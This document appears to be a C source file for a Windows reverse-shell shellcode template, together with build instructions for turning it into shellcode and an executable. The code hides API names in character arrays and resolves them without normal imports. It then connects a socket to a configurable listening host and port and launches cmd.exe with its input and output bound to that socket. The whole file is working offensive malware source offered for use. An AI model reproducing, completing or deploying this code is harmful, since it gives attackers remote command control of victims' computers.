#include <windows.h>
#include "Structs.h"
#include "APIs.h"
/* 
 * 1. To build a shellcodeTemplate.bin, run buildShellcode.sh from a wsl.
 * 2. Then, use prepareShellcode.py to generate effective shellcodes starting from shellcodeTemplate.bin
 *		example: ./prepareShellcode.py --shellcodeTemplate bins/shellcodeTemplate.bin --lHost 127.0.0.1 --lPort 4444 --output bins/shellcode.bin
 *			-> to get a shellcode that opens a rev shell to 127.0.0.1:4444
 * 3. To build an example .exe from the effective shellcode.bin, compile and link runShellcode.asm and shellcode.bin with the commands:
 *		nasm -f win64 runshellcode.asm -o objects/runshellcode.o
 *		x86_64-w64-mingw32-ld objects/runshellcode.o -o exes/runshellcode.exe
 */

// Needed APIs function signatures
typedef HMODULE(*fnLoadLibraryW)(IN LPCWSTR lpLibFileName);
typedef BOOL(*fnCreateProcessA) (IN LPCSTR lpApplicationName, IN OUT LPSTR lpCommandLine, IN LPSECURITY_ATTRIBUTES lpProcessAttributes, IN LPSECURITY_ATTRIBUTES lpThreadAttributes, IN BOOL bInheritHandles, IN DWORD dwCreationFlags, IN LPVOID lpEnvironment, IN LPCSTR lpCurrentDirectory, IN LPSTARTUPINFOA lpStartupInfo, OUT LPPROCESS_INFORMATION lpProcessInformation);
typedef int (*fnWSAStartup)(IN WORD wVersionRequired, OUT LPWSADATA lpWSAData);
typedef SOCKET (WSAAPI *fnWSASocketW) (IN int af, IN int type, IN int protocol, IN LPWSAPROTOCOL_INFOW lpProtocolInfo, IN GROUP g, IN DWORD dwFlags);
typedef INT(WSAAPI *fnInetPtonW) (IN INT Family, IN PCWSTR pszAddrString, OUT PVOID pAddrBuf);
typedef u_short(*fnhtons)(IN u_short hostshort);
typedef int (WSAAPI* fnconnect)(IN SOCKET s, IN const struct sockaddr* name, IN int namelen);


// struct that contains resolved APIs
typedef struct _API_TABLE {
	fnLoadLibraryW LoadLibraryW;
	fnCreateProcessA CreateProcessA;
	fnWSAStartup WSAStartup;
	fnWSASocketW WSASocketW;
	fnInetPtonW InetPtonW;
	fnhtons htons;
	fnconnect connect;
} API_TABLE, * PAPI_TABLE;


// struct that contains APIs and global variables
typedef struct _GLOBAL_DATA {
	API_TABLE APIs;
	const wchar_t* lHost;			// IP of listening host
	unsigned int lPort;				// port listening for reverse shell
} GLOBAL_DATA, * PGLOBAL_DATA;

/*
 * Find the needed APIs addresses and fill the APIs table.
 *
 * @param[out] APITable pointer to the table that will contain the addresses of APIs.
 * @return	true if succeded, false otherwise.
 */
BOOL resolveAPIs(OUT PAPI_TABLE APITable) {
	// assuming kernel32.dll already loaded, otherwise we need to use LdrLoadDll from ntdll
	
	// retrieve kernel32 functions
	wchar_t kernel32Name[] = { L'K', L'e', L'r', L'n', L'e', L'l', L'3', L'2', L'.', L'd', L'l', L'l', 0x0 };
	HMODULE hKernel32 = GetModuleHandleReplacement(kernel32Name);
	if (!hKernel32) {
		return 0;
	}
	// Retrieve LoadLibraryW
	char LoadLibraryWName[] = { 'L', 'o', 'a', 'd', 'L', 'i', 'b', 'r', 'a', 'r', 'y', 'W', 0x0 };
	APITable->LoadLibraryW = (fnLoadLibraryW)GetProcAddressReplacement(hKernel32, LoadLibraryWName);
	if (!APITable->LoadLibraryW)
		return 0;
	// Retrieve LoadLibraryW
	char CreateProcessAName[] = { 'C', 'r', 'e', 'a', 't', 'e', 'P', 'r', 'o', 'c', 'e', 's', 's', 'A', 0x0 };
	APITable->CreateProcessA = (fnCreateProcessA)GetProcAddressReplacement(hKernel32, CreateProcessAName);
	if (!APITable->CreateProcessA)
		return 0;


	// Retrieve ws2_32.dll functions (loading the library)
	wchar_t ws2_32Name[] = { L'w', L's', L'2', L'_', L'3', L'2', L'.', L'd', L'l', L'l', 0x0 };
	HMODULE hWs2_32 = APITable->LoadLibraryW(ws2_32Name);
	if (!hWs2_32)
		return 0;
	// Retrieve WSAStartup
	char WSAStartupName[] = { 'W', 'S', 'A', 'S', 't', 'a', 'r', 't', 'u', 'p', 0x0 };
	APITable->WSAStartup = (fnWSAStartup)GetProcAddressReplacement(hWs2_32, WSAStartupName);
	if (!APITable->WSAStartup)
		return 0;
	// Retrieve WSASocketW
	char WSASocketWName[] = { 'W', 'S', 'A', 'S', 'o', 'c', 'k', 'e', 't', 'W', 0x0 };
	APITable->WSASocketW = (fnWSASocketW)GetProcAddressReplacement(hWs2_32, WSASocketWName);
	if (!APITable->WSASocketW)
		return 0;
	// Retrieve InetPtonW
	char InetPtonWName[] = { 'I', 'n', 'e', 't', 'P', 't', 'o', 'n', 'W', 0x0 };
	APITable->InetPtonW = (fnInetPtonW)GetProcAddressReplacement(hWs2_32, InetPtonWName);
	if (!APITable->InetPtonW)
		return 0;
	// Retrieve htons
	char htonsName[] = { 'h', 't', 'o', 'n', 's', 0x0 };
	APITable->htons = (fnhtons)GetProcAddressReplacement(hWs2_32, htonsName);
	if (!APITable->htons)
		return 0; 
	// Retrieve connect
	char connectName[] = { 'c', 'o', 'n', 'n', 'e', 'c', 't', 0x0 };
	APITable->connect = (fnconnect)GetProcAddressReplacement(hWs2_32, connectName);
	if (!APITable->connect)
		return 0;
	return 1;
}


/*
 * Function that run the main shellcode code.
 * In this case, it creates a socket and attach it to stdin, stdout and stderr of a newly created cmd.exe process
 * @param[in] globalData struct that contains "global" variables and resolved APIs. It contains lHost and lPort variables
 */
BOOL shellcodeWorker(IN PGLOBAL_DATA globalData) {
	WSADATA wsaData;

	// Call WSAStartup(), start DLL usage by this process
	int WSAStartup_Result = globalData->APIs.WSAStartup(MAKEWORD(2, 2), &wsaData);
	if (WSAStartup_Result != 0) {
		return 0;
	}

	// Call WSASocket()
	// Create a socket with IPv4 addresses(AF_INET), using TCP (SOCK_STREAM, IPPROTO_TCP) 
	SOCKET mysocket = globalData->APIs.WSASocketW(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, NULL);

	// Create sockaddr_in struct
	struct sockaddr_in sa;
	sa.sin_family = AF_INET;
	//.sin_addr.s_addr = inet_addr(rem_host.c_str());
	globalData->APIs.InetPtonW(AF_INET, globalData->lHost, &sa.sin_addr.s_addr);
	sa.sin_port = globalData->APIs.htons(globalData->lPort);

	// Call connect()
	int connect_Result = globalData->APIs.connect(mysocket, (struct sockaddr*)&sa, sizeof(sa));
	if (connect_Result != 0) {
		return 0;
	}

	// Call CreateProcessA()
	STARTUPINFOA si;
	memset(&si, 0, sizeof(si));
	si.cb = sizeof(si);
	// set stdin, stdout and stderr to use the socker
	si.dwFlags = (STARTF_USESTDHANDLES);
	si.hStdInput = (HANDLE)mysocket;
	si.hStdOutput = (HANDLE)mysocket;
	si.hStdError = (HANDLE)mysocket;
	PROCESS_INFORMATION pi;
	char prog[] = { 'c', 'm', 'd', 0x0 };
	globalData->APIs.CreateProcessA(NULL, prog, NULL, NULL, TRUE, 0, NULL, NULL, &si, &pi);
	return 1;
}

/*
 * Effective entrypoint of the shellcode. This functions calls the APIs initializer and then calls the shellcode's worker function.
 * Since lHost is a unicode string located in the shellcode (RX data), it is const (not writable). lPort is not const since it is passed by value (lHost passed by pointer).
 */
void entrypoint(IN const wchar_t* lHost, IN unsigned int lPort) {
	GLOBAL_DATA globalData;
	if (!resolveAPIs(&(globalData.APIs)))
		return;
	// set "global" variables used by shellcodeWorker
	globalData.lHost = lHost;
	globalData.lPort = lPort;
	shellcodeWorker(&globalData);
}

